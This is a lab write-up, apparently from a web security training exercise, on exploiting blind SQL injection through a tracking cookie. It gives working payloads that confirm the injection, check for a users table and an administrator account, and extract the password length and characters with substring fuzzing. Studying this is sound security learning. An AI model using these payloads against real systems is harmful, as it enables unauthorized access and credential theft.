





## Exploiting blind SQL injection by triggering conditional responses (tracking-ID)

**Step 1: Cofirm that the parameter is vulnerable to blind SQLi**

- Find out something seem sus: in this case, the application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this: `Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`
- After testing its logic, we notice that: When we access to the web-app with `Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`, there will be a **Welcome back** message in the main page. But if we alter the **TrackingId**, there wont be any message.
- The query might look like this: Select tracking-id from tracking-table where tracking-id = 'your-tracking-id'.
- Case 1: if tracking-id exists --> query return value --> Welcome back message --> Test with: `Cookie: TrackingId=...' and 1=1 --
- Case 2: if not --. query return nothing --> no Welcome back message --> Test with: `Cookie: TrackingId=..' and 1=2 --
- Test both cases, and if the result from both cases as expected ==> Vulnerable

**Step 2: Confirm tables**

- Since we were provided that there's a **USERS** table --> confirm its exists with: `' and (select 'x' from users LIMIT 1) = 'x' --`
- Explain: if there is an **USERS** table, output value 'x' for each entry in the table. Because there might be many entry, which may destroy our query --> `LIMIT 1` to limit it to 1 entry. Then compare the output (which we expected to be 'x') if its equal to 'x'. If there is a **USERS** table, the output from `(select 'x' from users LIMIT 1)` will be 'x'. Then, `(select 'x' from users LIMIT 1) = 'x'` will become 'x'='x' ==> **TRUE** statement. Else, if there is no **USERS** table ==> **FALSE** statement.
- Expected Result: if there a **welcome back message** --> **USERS** table exists.

**Step 3: Confirm username**

- We were provided that username **'administrator'** exists --> confirm it.
- `' and (select username from users where username = 'administrator') = 'administrator' --`
- Explain: it will output text **'administrator'** if that username actually exists in the **USERS** table - which we expected. If **TRUE**, the output will be checking if 'administrator'='admintrator'.
- Expected Result: if there a **welcome back message** --> **administrator** username exists.

**Step 4: Blind guess password**

- What we found: **USERS table**, username: **administrator**. USER table has column named: **password**.
- First, guess the **length of password**: `' and (select username from users where username = 'administrator' and length(password) > 1) = 'administrator' --`, `' and (select username from users where username = 'administrator' and length(password) < 15) = 'administrator' --`, `' and (select username from users where username = 'administrator' and length(password) = 20) = 'administrator' --`. --> **Password length = 20**
- Then, **guess the first letter** by fuzzing with alpha-numer wordlist: `' and (select substring(password,1,1) from users where username = 'administrator') = 'word-list' --`. --> **first letter is: l** --> meaning so far everything is correct.
- Finally, **guess the whole password** with 2 wordlists and quite some time. `' and (select substring(password,number-list,1) from users where username = 'administrator') = 'alpha-num-list' --` 

**Note:** When using **ffuf** to fuzz it, **do not do this: `'FUZZ2'`, do this: `FUZZ2` with `' '` for each letter inside the wordlist** 
